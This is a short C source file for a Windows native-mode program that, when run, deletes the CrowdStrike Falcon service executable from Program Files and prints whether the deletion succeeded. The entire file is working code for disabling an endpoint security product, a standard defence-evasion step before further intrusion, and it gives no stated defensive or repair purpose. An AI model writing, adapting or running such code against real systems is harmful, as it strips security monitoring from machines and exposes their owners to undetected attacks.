#include <Windows.h>
#include <Winternl.h>
#include <winnt.h>

#pragma comment(lib, "ntdll.lib")


extern NTSTATUS NtDisplayString(PUNICODE_STRING String);
extern NTSTATUS NtDeleteFile(POBJECT_ATTRIBUTES ObjectAttributes);

extern void NtProcessStartup()
{
    OBJECT_ATTRIBUTES obj_attr = { 0 };
    UNICODE_STRING file_path = { 0 };
    UNICODE_STRING status_msg = { 0 };

    RtlInitUnicodeString(&file_path, L"\\??\\C:\\Program Files\\CrowdStrike\\CSFalconService.exe");
    InitializeObjectAttributes(&obj_attr, &file_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    if (NT_SUCCESS(NtDeleteFile(&obj_attr))) {
        RtlInitUnicodeString(&status_msg, L"deleted\n");
    }
    else {
        RtlInitUnicodeString(&status_msg, L"failed\n");
    }
    (void)NtDisplayString(&status_msg);
}

